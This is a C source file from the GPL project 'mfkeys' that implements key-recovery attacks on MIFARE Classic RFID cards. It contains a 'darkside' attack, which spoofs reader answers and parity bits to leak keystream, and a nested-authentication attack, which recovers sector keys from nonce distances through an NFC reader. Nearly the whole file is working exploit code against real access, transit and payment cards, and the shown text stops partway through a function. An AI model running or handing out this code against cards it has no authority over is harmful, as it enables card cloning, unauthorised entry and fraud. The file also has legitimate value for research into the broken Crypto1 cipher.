/*  
    
    This file is a part of mfkeys

    Copyright (c) 2010 Christian Panton <christian@panton.org>

    mfkeys is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    mfkeys is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with mfkeys.  If not, see <http://www.gnu.org/licenses/>.
    
*/

#include <nfc/nfc.h>
#include <byteswap.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

#include "mifare.h"
#include "nfc-helper.h"
#include "crapto1.h"

#include "mfcrack.h"

tag_nonce_entry_t arrSpoofEntries[MAX_TAG_NONCES];
uint32_t numSpoofEntries = 0;
uint32_t numAuthAttempts = 0;

bool darkside_keyrecovery(nfc_device* pnd, byte_t* uid, uint8_t keytype, uint32_t sector, byte_t *key)
{

    memset((void *)arrSpoofEntries, 0, sizeof(arrSpoofEntries));
    uint64_t ui64KeyRecovered = 0;
    uint8_t uiErrCode;
    uint8_t block;
    
    block = sector * 4;
    
    if(sector > 15)
        block = 64 + (sector-16)*16;    
    
    int i;
    int maxnum = 0;
    int count = 0;
    int nonce = 0;
    int id;
    
    do
    {

        mf_configure(pnd);
        mf_anticol(pnd,NULL);
        
        for(i = 0; i < numSpoofEntries; i++)
        {
        
            if(arrSpoofEntries[i].num_of_appearances > count)
            {
                count = arrSpoofEntries[i].num_of_appearances;
                nonce = arrSpoofEntries[i].tagNonce;
                id = i;
            }
        
            if(arrSpoofEntries[i].current_out_of_8 > maxnum)
            {
                count = arrSpoofEntries[i].num_of_appearances;
                maxnum = arrSpoofEntries[i].current_out_of_8 + 1;
                nonce = arrSpoofEntries[i].tagNonce;
                id = i;
            }
        }

        printf("Leading tag nonce [%02d/%02d = %0x] Count: [%03d] Combinations recovered : [%d/8]\r", id, numSpoofEntries, nonce, count, maxnum);
        
        fflush(stdout);

        uiErrCode = darkside_keyrecovery_inner(pnd, bswap_32 (*((uint32_t *) (uid))), 0, keytype == 0 ?keyA : keyB, block, &ui64KeyRecovered);


        numAuthAttempts++;
    } while (uiErrCode != 5);
  
    mfcuk_key_uint64_to_arr( &ui64KeyRecovered, key);
    
    printf("\n");
    
    return true;
    
}



bool na_keyrecovery(nfc_device* pnd, byte_t* uidx, uint8_t keytype, int a_sector, byte_t *key, uint8_t knownkeytype, int e_sector, byte_t *knownkey)
{

    int k, i, n, m;
    int probes = DEFAULT_PROBES_NR;
    int sets = DEFAULT_SETS_NR;

    static const char wait_art[5] = {'\\', '|', '/', '-', '?'};
    
    pKeys		*pk;
	countKeys	*ck;
	
	pk = (void *) malloc(sizeof(pKeys));
	
	denonce		d = {NULL, 0, DEFAULT_DIST_NR, DEFAULT_TOLERANCE, {0x00, 0x00, 0x00}};
	d.distances = (void *) calloc(d.num_distances, sizeof(u_int32_t));
    

    struct Crypto1State* pcs;
	struct Crypto1State* revstate;
	struct Crypto1State* revstate_start;
	
	uint32_t uid = (uint32_t) bytes_to_num(uidx, 4);

	uint64_t lfsr;
	
    int block, knownblock;
    
    block = a_sector * 4+3;
    if(a_sector > 15)
        block = 64 + (a_sector-16)*16;    
       
    knownblock = e_sector*4+3;
    if(e_sector > 15)
        knownblock = 64 + (e_sector-16)*16; 
        	
	// Possible key counter, just continue with a previous "session"
	uint32_t kcount = pk->size;
		
	byte_t Nr[4] = { 0x00,0x00,0x00,0x00 }; // Reader nonce
	byte_t Auth[4] = { 0x00, knownblock, 0x00, 0x00 };
	byte_t AuthEnc[4] = { 0x00, knownblock, 0x00, 0x00 };
	byte_t AuthEncPar[8] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
	
	byte_t ArEnc[8] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
	byte_t ArEncPar[8] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
	
	byte_t Rx[MAX_FRAME_LEN]; // Tag response
	byte_t RxPar[MAX_FRAME_LEN]; // Tag response
	ssize_t RxLen;
	
	uint32_t Nt, NtLast, NtProbe, NtEnc, Ks1;
	
	// Prepare AUTH command
	Auth[0] = knownkeytype ? 0x61 : 0x60;
	iso14443a_crc_append(Auth,2);
	// fprintf(stdout, "\nAuth command:\t");
	// print_hex(Auth, 4);
	
	// We need full control over the CRC
	nfc_configure(pnd, NP_HANDLE_CRC, false);
	nfc_configure (pnd, NP_EASY_FRAMING, false);

	// Get a plaintext nonce
	RxLen = nfc_initiator_transceive_bytes(pnd, Auth, 4, Rx, sizeof(Rx), 0);
	nfc_configure(pnd, NP_EASY_FRAMING, true);
	
	Nt = bytes_to_num(Rx, 4);
	
    pcs = crypto1_create(bytes_to_num(knownkey, 6));

	// Load (plain) uid^nt into the cipher {48..79} bits
	crypto1_word(pcs, bytes_to_num(Rx, 4) ^ uid, 0);
	
	// Generate (encrypted) nr+parity by loading it into the cipher
	for (i = 0; i < 4; i++) {
		// Load in, and encrypt the reader nonce (Nr)
		ArEnc[i] = crypto1_byte(pcs, Nr[i], 0) ^ Nr[i];
		ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nr[i]);
	}
	
	// Skip 32 bits in the pseudo random generator
	Nt = prng_successor(Nt, 32);
	
	// Generate reader-answer from tag-nonce
	for (i = 4; i < 8; i++) {
		// Get the next random byte
		Nt = prng_successor(Nt, 8);
		// Encrypt the reader-answer (Nt' = suc2(Nt))
		ArEnc[i] = crypto1_byte(pcs, 0x00, 0) ^ (Nt&0xff);
		ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nt);
	}
	
	nfc_configure(pnd, NP_HANDLE_PARITY, false);
	
	// Transmit reader-answer
	// fprintf(stdout, "\t{Ar}:\t");
	// print_hex_par(ArEnc, 64, ArEncPar);
	if ((RxLen = nfc_initiator_transceive_bits(pnd, ArEnc, 64, ArEncPar, Rx, RxPar)) != 32) {
		fprintf(stderr, "A Reader-answer transfer error, exiting..\n");
	}
	
	// Now print the answer from the tag
	// fprintf(stdout, "\t{At}:\t");
	// print_hex_par(Rx,RxLen,RxPar);
	
	// Decrypt the tag answer and verify that suc3(Nt) is At
	Nt = prng_successor(Nt, 32);
	if (!((crypto1_word(pcs, 0x00, 0) ^ bytes_to_num(Rx, 4)) == (Nt&0xFFFFFFFF))) {
		fprintf(stderr, "[At] is not Suc3(Nt), something is wrong, exiting..\n");
	}
  
    //fprintf(stdout, "Authentication completed.\n\n");


    // Max probes for auth for each sector
	for (k = 0; k < probes; ++k) {
		// Try to authenticate to exploit sector and determine distances (filling denonce.distances)
		
		for (m = 0; m < d.num_distances; m++) {
		    //fprintf(stdout, "Nested Auth number: %d\n", m);
		    // Encrypt Auth command with the current keystream
		    for (i = 0; i < 4; i++) {
	                    AuthEnc[i] = crypto1_byte(pcs,0x00,0) ^ Auth[i];
                		// Encrypt the parity bits with the 4 plaintext bytes
                		AuthEncPar[i] = filter(pcs->odd) ^ oddparity(Auth[i]);
		    }

		    // Sending the encrypted Auth command
		    if ((RxLen = nfc_initiator_transceive_bits(pnd, AuthEnc, 32, AuthEncPar,Rx, RxPar)) < 0) {
			    fprintf(stdout, "A Error requesting encrypted tag-nonce\n");
			    return false;
		    }

		    // Decrypt the encrypted auth 
		    pcs = crypto1_create(bytes_to_num(knownkey, 6));

		    NtLast = bytes_to_num(Rx, 4) ^ crypto1_word(pcs, bytes_to_num(Rx, 4) ^ uid, 1); 
		
		    // Save the determined nonces distance
		    d.distances[m] = nonce_distance(Nt, NtLast);
		    // fprintf(stdout, "distance: %05d\n", d.distances[m]);
		
		    // Again, prepare and send {At}
		    for (i = 0; i < 4; i++) {
			    ArEnc[i] = crypto1_byte(pcs, Nr[i], 0) ^ Nr[i];
			    ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nr[i]);
		    }
		    Nt = prng_successor(NtLast, 32);
		    for (i = 4; i < 8; i++) {
			    Nt = prng_successor(Nt, 8);
			    ArEnc[i] = crypto1_byte(pcs, 0x00, 0) ^ (Nt&0xFF);
			    ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nt);
		    }
		    nfc_configure(pnd,NP_HANDLE_PARITY,false);
		    if ((RxLen = nfc_initiator_transceive_bits(pnd, ArEnc, 64, ArEncPar, Rx, RxPar)) != 32) {
			    fprintf(stderr, "AA Reader-answer transfer error, exiting..\n");
		    }
		    Nt = prng_successor(Nt, 32);
		    if (!((crypto1_word(pcs, 0x00, 0) ^ bytes_to_num(Rx, 4)) == (Nt&0xFFFFFFFF))) {
			    fprintf(stderr, "[At] is not Suc3(Nt), something is wrong, exiting..\n");
		    }
	    } // Next auth probe
	
	    // Find median from all distances
	    d.median = median(d);
		
		
		//fprintf(stdout,"- probe %d, distance %d ", k, d.median);
		// Configure device to the previous state  
		
		
		//////////////***********VVVVVVVVVVVVVVVVVVVVVVV*************///////////////
		
		mf_configure(pnd);
		mf_anticol(pnd, NULL);
        
        Auth[0] = knownkeytype ? 0x61 : 0x60;
        Auth[1] = knownblock; //a_sector; 
        iso14443a_crc_append(Auth,2);
        // fprintf(stdout, "\nAuth command:\t");
        // print_hex(Auth, 4);

        // We need full control over the CRC
        nfc_configure(pnd, NP_HANDLE_CRC, false);
        nfc_configure (pnd, NP_EASY_FRAMING, false);

        // Get a plaintext nonce
        RxLen = nfc_initiator_transceive_bytes(pnd, Auth, 4, Rx, sizeof(Rx), 0);
        nfc_configure(pnd, NP_EASY_FRAMING, true);

        Nt = bytes_to_num(Rx, 4);

        pcs = crypto1_create(bytes_to_num(knownkey, 6));

        // Load (plain) uid^nt into the cipher {48..79} bits
        crypto1_word(pcs, bytes_to_num(Rx, 4) ^ uid, 0);

        // Generate (encrypted) nr+parity by loading it into the cipher
        for (i = 0; i < 4; i++) {
	        // Load in, and encrypt the reader nonce (Nr)
	        ArEnc[i] = crypto1_byte(pcs, Nr[i], 0) ^ Nr[i];
	        ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nr[i]);
        }

        // Skip 32 bits in the pseudo random generator
        Nt = prng_successor(Nt, 32);

        // Generate reader-answer from tag-nonce
        for (i = 4; i < 8; i++) {
	        // Get the next random byte
	        Nt = prng_successor(Nt, 8);
	        // Encrypt the reader-answer (Nt' = suc2(Nt))
	        ArEnc[i] = crypto1_byte(pcs, 0x00, 0) ^ (Nt&0xff);
	        ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nt);
        }

        nfc_configure(pnd, NP_HANDLE_PARITY, false);

        // Transmit reader-answer
        // fprintf(stdout, "\t{Ar}:\t");
        // print_hex_par(ArEnc, 64, ArEncPar);
        if ((RxLen = nfc_initiator_transceive_bits(pnd, ArEnc, 64, ArEncPar, Rx, RxPar)) != 32) {
	        fprintf(stderr, "AAA Reader-answer transfer error, exiting..\n");
        }

        // Now print the answer from the tag
        // fprintf(stdout, "\t{At}:\t");
        // print_hex_par(Rx,RxLen,RxPar);

        // Decrypt the tag answer and verify that suc3(Nt) is At
        Nt = prng_successor(Nt, 32);
        if (!((crypto1_word(pcs, 0x00, 0) ^ bytes_to_num(Rx, 4)) == (Nt&0xFFFFFFFF))) {
	        fprintf(stderr, "[At] is not Suc3(Nt), something is wrong, exiting..\n");
        }
      
        //fprintf(stdout, "Authentication completed.\n\n");
        
        //////////////***********^^^^^^^^^^^^^^^^^^^^*************///////////////
	
		pk->possibleKeys = NULL;
		pk->size = 0;
		
		
		
		// We have 'sets' * 32b keystream of potential keys
		for (n = 0; n < sets; n++) {
			// AUTH + Recovery key mode (for a_sector), repeat 5 times
			
			Auth[0] = keytype ? 0x61 : 0x60;
            Auth[1] = block; //a_sector; 
            
			kcount = pk->size;
			
		    
		    iso14443a_crc_append(Auth,2);
		
		    // Encryption of the Auth command, sending the Auth command
		    for (i = 0; i < 4; i++) {
			    AuthEnc[i] = crypto1_byte(pcs,0x00,0) ^ Auth[i];
			    // Encrypt the parity bits with the 4 plaintext bytes
			    AuthEncPar[i] = filter(pcs->odd) ^ oddparity(Auth[i]);
		    }
		    
		    
		    if ((RxLen = nfc_initiator_transceive_bits(pnd, AuthEnc, 32, AuthEncPar, Rx, RxPar)) < 0) {
			    fprintf(stdout, "B Error requesting encrypted tag-nonce\n");
		    }
		
		    // Save the encrypted nonce
		    NtEnc = bytes_to_num(Rx, 4);
		
		    // Parity validity check
		    for (i = 0; i < 3; ++i) {
			    d.parity[i] = (oddparity(Rx[i]) != RxPar[i]);
		    }		
	
		    // Iterate over Nt-x, Nt+x
		    //fprintf(stdout, "Iterate from %d to %d\n", d.median-d.tolerance, d.median+d.tolerance);
		
		    NtProbe = prng_successor(Nt, d.median-d.tolerance);
		    for (m = d.median-d.tolerance; m <= d.median+d.tolerance; m +=2) {
			
			    // Try to recover the keystream1 
			    Ks1 = NtEnc ^ NtProbe;
					
			    // Skip this nonce after invalid 3b parity check
			    revstate_start = NULL;
			    if (valid_nonce(NtProbe, NtEnc, Ks1, d.parity)) {
				    // And finally recover the first 32 bits of the key
				    revstate = lfsr_recovery32(Ks1, NtProbe ^ uid);
                                    if (revstate_start == NULL) {
                                            revstate_start = revstate;
                                    }
				    while ((revstate->odd != 0x0) || (revstate->even != 0x0)) {
					    lfsr_rollback_word(revstate, NtProbe ^ uid, 0);
					    crypto1_get_lfsr(revstate, &lfsr);
					    // Allocate a new space for keys
					    if (((kcount % MEM_CHUNK) == 0) || (kcount >= pk->size)) {
						    pk->size += MEM_CHUNK;
						    // fprintf(stdout, "New chunk by %d, sizeof %lu\n", kcount, pk->size * sizeof(uint64_t));
						    pk->possibleKeys = (uint64_t *) realloc((void *)pk->possibleKeys, pk->size * sizeof(uint64_t));
						    if (pk->possibleKeys == NULL) {
							    fprintf(stderr, "Memory allocation error for pk->possibleKeys\n"); 
						    }
					    }
					    pk->possibleKeys[kcount] = lfsr;
					    kcount++;
					    revstate++;
				    }
				    free(revstate_start);
			    }
			    NtProbe = prng_successor(NtProbe, 2);
		    }
		    // Truncate
		    if (kcount != 0) {
			    pk->size = --kcount;
			    if ((pk->possibleKeys = (uint64_t *) realloc((void *)pk->possibleKeys, pk->size * sizeof(uint64_t))) == NULL) {
				    fprintf(stderr, "Memory allocation error for pk->possibleKeys\n"); 
			    }		
		    }
		    
			//////////////***********VVVVVVVVVVVVVVVVVVVVVVV*************///////////////
			
		    mf_configure(pnd);
		    mf_anticol(pnd, NULL);

                    
            // Prepare AUTH command
	        Auth[0] = knownkeytype ? 0x61 : 0x60;
	        Auth[1] = knownblock; //a_sector; 
	        iso14443a_crc_append(Auth,2);
	        // fprintf(stdout, "\nAuth command:\t");
	        // print_hex(Auth, 4);
	
	        // We need full control over the CRC
	        nfc_configure(pnd, NP_HANDLE_CRC, false);
	        nfc_configure (pnd, NP_EASY_FRAMING, false);

	        // Get a plaintext nonce
	        RxLen = nfc_initiator_transceive_bytes(pnd, Auth, 4, Rx, sizeof(Rx), 0);
	        nfc_configure(pnd, NP_EASY_FRAMING, true);
	
	        Nt = bytes_to_num(Rx, 4);
	
            pcs = crypto1_create(bytes_to_num(knownkey, 6));

	        // Load (plain) uid^nt into the cipher {48..79} bits
	        crypto1_word(pcs, bytes_to_num(Rx, 4) ^ uid, 0);
	
	        // Generate (encrypted) nr+parity by loading it into the cipher
	        for (i = 0; i < 4; i++) {
		        // Load in, and encrypt the reader nonce (Nr)
		        ArEnc[i] = crypto1_byte(pcs, Nr[i], 0) ^ Nr[i];
		        ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nr[i]);
	        }
	
	        // Skip 32 bits in the pseudo random generator
	        Nt = prng_successor(Nt, 32);
	
	        // Generate reader-answer from tag-nonce
	        for (i = 4; i < 8; i++) {
		        // Get the next random byte
		        Nt = prng_successor(Nt, 8);
		        // Encrypt the reader-answer (Nt' = suc2(Nt))
		        ArEnc[i] = crypto1_byte(pcs, 0x00, 0) ^ (Nt&0xff);
		        ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nt);
	        }
	
	        nfc_configure(pnd, NP_HANDLE_PARITY, false);
	
	        // Transmit reader-answer
	        // fprintf(stdout, "\t{Ar}:\t");
	        // print_hex_par(ArEnc, 64, ArEncPar);
	        if ((RxLen = nfc_initiator_transceive_bits(pnd, ArEnc, 64, ArEncPar, Rx, RxPar)) != 32) {
		        fprintf(stderr, "AAAA Reader-answer transfer error, exiting..\n");
	        }
	
	        // Now print the answer from the tag
	        // fprintf(stdout, "\t{At}:\t");
	        // print_hex_par(Rx,RxLen,RxPar);
	
	        // Decrypt the tag answer and verify that suc3(Nt) is At
	        Nt = prng_successor(Nt, 32);
	        if (!((crypto1_word(pcs, 0x00, 0) ^ bytes_to_num(Rx, 4)) == (Nt&0xFFFFFFFF))) {
		        fprintf(stderr, "[At] is not Suc3(Nt), something is wrong, exiting..\n");
	        }
          
            //fprintf(stdout, "Authentication completed.\n\n");
		    
		    
		    
			fprintf(stdout, "%c\b", wait_art[n]);
			fflush(stdout);
		}
		
		
		
		mf_configure(pnd);
	    mf_anticol(pnd, NULL);
		
		// Get first 15 grouped keys
		ck = uniqsort(pk->possibleKeys, pk->size);
		for (i = 0; i < TRY_KEYS ; i++) {
			// We don't known this key, try to break it
			// This key can be found here two or more times
			if (ck[i].count > 0) {
				
				//fprintf(stdout,"%d %llx\n",ck[i].count, ck[i].key);
				num_to_bytes(ck[i].key, 6, key); 

				if(mf_checkkey(pnd, uidx, a_sector, keytype, key))
				{
				    crypto1_destroy(pcs);
		            free(pk->possibleKeys);
		            free(ck);	
				    return true;
				}

			}
		}
		
		crypto1_destroy(pcs);
	    free(pk->possibleKeys);
	    free(ck);
		
		//////////////***********VVVVVVVVVVVVVVVVVVVVVVV*************///////////////
		
		
			
		
		
	    mf_configure(pnd);
	    mf_anticol(pnd, NULL);
	
	    Auth[0] = knownkeytype ? 0x61 : 0x60;
	    Auth[1] = knownblock; //a_sector; 
        iso14443a_crc_append(Auth,2);
        // fprintf(stdout, "\nAuth command:\t");
        // print_hex(Auth, 4);

        // We need full control over the CRC
        nfc_configure(pnd, NP_HANDLE_CRC, false);
        nfc_configure (pnd, NP_EASY_FRAMING, false);

        // Get a plaintext nonce
        RxLen = nfc_initiator_transceive_bytes(pnd, Auth, 4, Rx, sizeof(Rx), 0);
        nfc_configure(pnd, NP_EASY_FRAMING, true);

        Nt = bytes_to_num(Rx, 4);

        pcs = crypto1_create(bytes_to_num(knownkey, 6));

        // Load (plain) uid^nt into the cipher {48..79} bits
        crypto1_word(pcs, bytes_to_num(Rx, 4) ^ uid, 0);

        // Generate (encrypted) nr+parity by loading it into the cipher
        for (i = 0; i < 4; i++) {
	        // Load in, and encrypt the reader nonce (Nr)
	        ArEnc[i] = crypto1_byte(pcs, Nr[i], 0) ^ Nr[i];
	        ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nr[i]);
        }

        // Skip 32 bits in the pseudo random generator
        Nt = prng_successor(Nt, 32);

        // Generate reader-answer from tag-nonce
        for (i = 4; i < 8; i++) {
	        // Get the next random byte
	        Nt = prng_successor(Nt, 8);
	        // Encrypt the reader-answer (Nt' = suc2(Nt))
	        ArEnc[i] = crypto1_byte(pcs, 0x00, 0) ^ (Nt&0xff);
	        ArEncPar[i] = filter(pcs->odd) ^ oddparity(Nt);
        }

        nfc_configure(pnd, NP_HANDLE_PARITY, false);

        // Transmit reader-answer
        // fprintf(stdout, "\t{Ar}:\t");
        // print_hex_par(ArEnc, 64, ArEncPar);
        if ((RxLen = nfc_initiator_transceive_bits(pnd, ArEnc, 64, ArEncPar, Rx, RxPar)) != 32) {
	        fprintf(stderr, "Reader-answer transfer error, exiting..\n");
        }

        // Now print the answer from the tag
        // fprintf(stdout, "\t{At}:\t");
        // print_hex_par(Rx,RxLen,RxPar);

        // Decrypt the tag answer and verify that suc3(Nt) is At
        Nt = prng_successor(Nt, 32);
        if (!((crypto1_word(pcs, 0x00, 0) ^ bytes_to_num(Rx, 4)) == (Nt&0xFFFFFFFF))) {
	        fprintf(stderr, "[At] is not Suc3(Nt), something is wrong, exiting..\n");
        }
      
        //fprintf(stdout, "Authentication completed.\n\n");
		
	    
	}


	return false;
}

				

// Return the median value from the nonce distances array
uint32_t median(denonce d) {
	int middle = (int) d.num_distances / 2;
	qsort(d.distances, d.num_distances, sizeof(uint32_t), compar_int);
	
	if (d.num_distances % 2 == 1) {
		// Odd number of elements
		return d.distances[middle];
	} else {
		// Even number of elements, return the smaller value
		return (uint32_t) (d.distances[middle-1]);
	}
}

int compar_int(const void * a, const void * b) {
	return (*(uint64_t*)b - *(uint64_t*)a);
}

// Compare countKeys structure
int compar_special_int(const void * a, const void * b) {
	return (((countKeys *)b)->count - ((countKeys *)a)->count);
}

countKeys * uniqsort(uint64_t *possibleKeys, uint32_t size) {
	int i, j = 0;
	int count = 0;
	countKeys *our_counts;
	
	qsort(possibleKeys, size, sizeof (uint64_t), compar_int);
	
	our_counts = calloc(size, sizeof(countKeys));
	if (our_counts == NULL) {
		fprintf(stderr, "Memory allocation error for our_counts\n");
		exit(1);
	}
	
	for (i = 0; i < size; i++) {
        if (possibleKeys[i+1] == possibleKeys[i]) { 
			count++;
		} else {
			our_counts[j].key = possibleKeys[i];
			our_counts[j].count = count;
			j++;
			count=0;
		}
	}
	qsort(our_counts, j, sizeof(countKeys), compar_special_int);
	return (our_counts);
}


// Return 1 if the nonce is invalid else return 0
int valid_nonce(uint32_t Nt, uint32_t NtEnc, uint32_t Ks1, byte_t * parity) {
	return ((odd_parity((Nt >> 24) & 0xFF) == ((parity[0]) ^ odd_parity((NtEnc >> 24) & 0xFF) ^ BIT(Ks1,16))) & \
	(odd_parity((Nt >> 16) & 0xFF) == ((parity[1]) ^ odd_parity((NtEnc >> 16) & 0xFF) ^ BIT(Ks1,8))) & \
	(odd_parity((Nt >> 8) & 0xFF) == ((parity[2]) ^ odd_parity((NtEnc >> 8) & 0xFF) ^ BIT(Ks1,0)))) ? 1 : 0;
}

void num_to_bytes(uint64_t n, uint32_t len, byte_t* dest) {
	while (len--) {
		dest[len] = (byte_t) n;
		n >>= 8;
	}
}


uint32_t darkside_keyrecovery_inner(nfc_device* pnd, uint32_t uiUID, uint64_t ui64Key, mifare_key_type bKeyType, uint32_t uiBlock, uint64_t *ui64KeyRecovered)
{
    // Communication variables
    uint32_t pos, pos2, nt;
    struct Crypto1State* pcs;
    byte_t abtAuth[4]        = { 0x60,0x00,0x00,0x00 };
    byte_t abtArEnc[8]       = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
    byte_t abtArEncPar[8]    = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
    byte_t abtRx[MAX_FRAME_LEN];
    byte_t abtRxPar[MAX_FRAME_LEN];
    ssize_t szRx;
    
   

    // zveriu
    static uint32_t nt_orig = 0;
    char sendSpoofAr = 0; // We want to spoof the Ar response with all 0s and the use random parity bits for that Nt until we have a successful 4 bits response (0x5)
    tag_nonce_entry_t *ptrFoundTagNonceEntry = NULL;

    // Key-recovery variables
    struct Crypto1State *states_list;
    struct Crypto1State *current_state;
    uint32_t i;
    uint64_t key_recovered;
    byte_t flag_key_recovered = 0; // FIXME: fix the {Nr} iteration properly. This a quick fix for cases when 0xDEADBEEF {Nr} is not working

    // Configure the authentication frame using the supplied block
    abtAuth[0] = bKeyType;
    abtAuth[1] = uiBlock;
    iso14443a_crc_append(abtAuth,2);

    // Now we take over, first we need full control over the CRC
    nfc_configure(pnd,NP_HANDLE_CRC,false);

    // We need to disable EASY_FRAMING feature to talk in "raw" mode
    nfc_configure (pnd, NP_EASY_FRAMING, false);

    // Request plain tag-nonce
    //printf("Nt: ");
    if (szRx = nfc_initiator_transceive_bytes(pnd,abtAuth,4,abtRx,sizeof(abtRx), 0) < 0)
    {
        return 1;
    }
    nfc_configure (pnd, NP_EASY_FRAMING, true);

    //print_hex(abtRx,4);

    // Save the tag nonce (nt)
    nt = bswap_32(*((uint32_t *) &abtRx));

	// zveriu
	//printf("INFO - Nonce distance %d (from 0x%08x, to 0x%08x)\n", nonce_distance(nt, nt_orig), nt, nt_orig);
	nt_orig = nt;

    // Max log(2, MAX_TAG_NONCES) searches, i.e. log(2, 65536) = 16
    ptrFoundTagNonceEntry = (tag_nonce_entry_t *) bsearch((void *)(&nt_orig), arrSpoofEntries, numSpoofEntries, sizeof(arrSpoofEntries[0]), compareTagNonces);

    // A new tag nonce detected, initialize it properly and store in the tag nonce "cache" array for use in it's next appearances
    if (!ptrFoundTagNonceEntry)
    {
        if (numSpoofEntries >= MAX_TAG_NONCES)
        {
            printf("\n\nFAILURE - REACHED MAX_TAG_NONCES!!! (Are we so unlucky or the USB/reader is buggy?!)\n\n");
            return 2;
        }

        arrSpoofEntries[numSpoofEntries].tagNonce = nt_orig;
        arrSpoofEntries[numSpoofEntries].num_of_appearances = 1;
        numSpoofEntries++;

        // Max log(2, MAX_TAG_NONCES) searches, i.e. log(2, 65536) = 16
        qsort(arrSpoofEntries, numSpoofEntries, sizeof(arrSpoofEntries[0]), compareTagNonces);

        ptrFoundTagNonceEntry = (tag_nonce_entry_t *) bsearch((void *)(&nt_orig), arrSpoofEntries, numSpoofEntries, sizeof(arrSpoofEntries[0]), compareTagNonces);

        // Put the initializations done in abtRxLen == 32 section here also because maybe we don't know the key actually
        ptrFoundTagNonceEntry->spoofFlag = 1;

        // Hardcoding {Nr} and {Ar} and try to guess parity bits
        ptrFoundTagNonceEntry->spoofNrEnc = MFCUK_DARKSIDE_START_NR;
        ptrFoundTagNonceEntry->spoofArEnc = MFCUK_DARKSIDE_START_AR;
        ptrFoundTagNonceEntry->spoofParBitsEnc = 0x0;

        // First we need to satisfy STAGE1
        ptrFoundTagNonceEntry->current_out_of_8 = -1;
    }
    else
    {
        ptrFoundTagNonceEntry->num_of_appearances++;

        
        if ( // If we went beyond MFCUK_DARKSIDE_MAX_LEVELS without findind a key, need to check next {Nr}
            (ptrFoundTagNonceEntry->current_out_of_8 >= MFCUK_DARKSIDE_MAX_LEVELS) ||
             // Can have only 32 combinations of the last 5 bits of parity bits which generated the first NACK
            ( (ptrFoundTagNonceEntry->current_out_of_8 >= 0) && (ptrFoundTagNonceEntry->parBitsCrntCombination[ptrFoundTagNonceEntry->current_out_of_8] >= 0x20) )
           )
        {
            // If no key discovered for current {Nr}, {Ar}, 29bit-prefix, go back to satisfy STAGE1 with other {Nr} value, {Ar} we keep the same
            ptrFoundTagNonceEntry->spoofNrEnc++;
            ptrFoundTagNonceEntry->spoofArEnc = MFCUK_DARKSIDE_START_AR;
            ptrFoundTagNonceEntry->spoofParBitsEnc = 0x0;
            ptrFoundTagNonceEntry->current_out_of_8 = -1;

            return 3;
        }
    }

    sendSpoofAr = ptrFoundTagNonceEntry->spoofFlag;

    // Init cipher with key
    pcs = crypto1_create(ui64Key);

    // Load (plain) uid^nt into the cipher
    for (pos=0; pos<4; pos++)
    {
        // Update the cipher with the tag-initialization 
        // TODO: remove later - crypto1_byte(pcs, pbtUid[pos]^abtRx[pos], 0);
        crypto1_byte(pcs, ((uiUID >> (8*(3-pos))) & 0xFF ) ^ abtRx[pos], 0);
    }

    // Generate (encrypted) nr+parity by loading it into the cipher (Nr)
    for (pos=0; pos<4; pos++)
    {
        // Load in, and encrypt, the reader nonce (plain nr=0x00000000)
        abtArEnc[pos] = crypto1_byte(pcs,0x00,0) ^ 0x00;

        // Encrypt the parity bits for the 4 plaintext bytes of nr
        abtArEncPar[pos] = filter(pcs->odd) ^ oddparity(0x00);

        if (sendSpoofAr)
        {
            if (ptrFoundTagNonceEntry->current_out_of_8 < 0)
            {
                abtArEnc[pos] = (ptrFoundTagNonceEntry->spoofNrEnc >> (8*(3-pos))) & 0xFF;
                abtArEncPar[pos] = (ptrFoundTagNonceEntry->spoofParBitsEnc >> (7-pos)) & 0x01;
            }
            else
            {
                abtArEnc[pos] = (ptrFoundTagNonceEntry->nrEnc[ptrFoundTagNonceEntry->current_out_of_8] >> (8*(3-pos))) & 0xFF;
                abtArEncPar[pos] = ((ptrFoundTagNonceEntry->parBits[ptrFoundTagNonceEntry->current_out_of_8] + ptrFoundTagNonceEntry->parBitsCrntCombination[ptrFoundTagNonceEntry->current_out_of_8]) >> (7-pos)) & 0x01;
            }
        }
    }

    // Skip 32 bits in pseudo random generator
    nt = prng_successor(nt,32);
  
    // Generate reader-answer from tag-nonce (Ar)
    for (pos=4; pos<8; pos++)
    {
        // Get the next random byte for verify the reader to the tag 
        nt = prng_successor(nt,8);

        // Encrypt the reader-answer (nt' = suc2(nt))
        abtArEnc[pos] = crypto1_byte(pcs,0x00,0) ^ (nt&0xff);
        // Encrypt the parity bits for the 4 plaintext bytes of nt'
        abtArEncPar[pos] = filter(pcs->odd) ^ oddparity(nt&0xff);

        // zveriu - Make the Ar incorrect, but leave parity bits calculated/guessed_spoofed as above
        /* If all eight parity bits are correct, but the answer Ar is
        wrong, the tag responds with the 4-bit error code 0x5
        signifying failed authentication, called "transmission error" in [KHG08].
        */
        if (sendSpoofAr)
        {
            if (ptrFoundTagNonceEntry->current_out_of_8 < 0)
            {
                abtArEnc[pos] = (ptrFoundTagNonceEntry->spoofArEnc >> (8*(7-pos))) & 0xFF;
                abtArEncPar[pos] = (ptrFoundTagNonceEntry->spoofParBitsEnc >> (7-pos)) & 0x01;
            }
            else
            {
                abtArEnc[pos] = (ptrFoundTagNonceEntry->arEnc[ptrFoundTagNonceEntry->current_out_of_8] >> (8*(7-pos))) & 0xFF;
